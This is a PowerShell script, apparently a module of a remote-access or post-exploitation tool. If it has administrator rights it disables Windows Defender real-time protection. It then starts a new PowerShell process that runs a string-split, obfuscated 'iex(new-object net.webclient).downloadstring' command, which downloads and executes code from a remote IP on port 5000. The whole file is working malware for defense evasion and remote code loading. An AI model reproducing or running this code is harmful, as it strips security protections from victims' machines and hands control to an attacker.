






function invoke-disableDefender{
    $ip=$global:remoteip
    $id=$global:id

    

    $good = $false
    $results = ""

    

    $results = disable-realtime -id $id -ip $ip
    if($results.Contains("successfully")){

        $good = $true
        $uri = "http://" + $ip + ":5000/consola"
        $command="iex"+"(n"+"ew"+"-"+"ob"+"ject net"+"."+"we"+"bcl"+"ient)"+"."+"down"+"load"+"str"+"ing('"+$uri+"');consola -id $id"
        Start-Process powershell -Argument "-command $command"

    }

    

    return @{results = $results; success = $good }
}

function disable-realtime {
    param(
        $id,
        $ip
        )
    $isAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
    

    if ($isAdmin){
            

            Set-MpPreference -DisableRealtimeMonitoring $true
            defenderStatus -id $id -ip $ip
    }else { return "Admin privileges required"}
}

function defenderStatus {

    param(
        $id,
        $ip
        )
        
    

    $outp = Get-MpPreference | Format-List DisableRealtimeMonitoring | out-string
    if ($outp.Contains("True")) {
        return "Defender RealTime Protection has been disabled successfully"
    } else { return "Defender RealTime Protection couldnÂ´t been disabled" }
}









$execute = invoke-disableDefender -ip $global:remoteip
return @{results = $execute.results; success = $execute.success; }



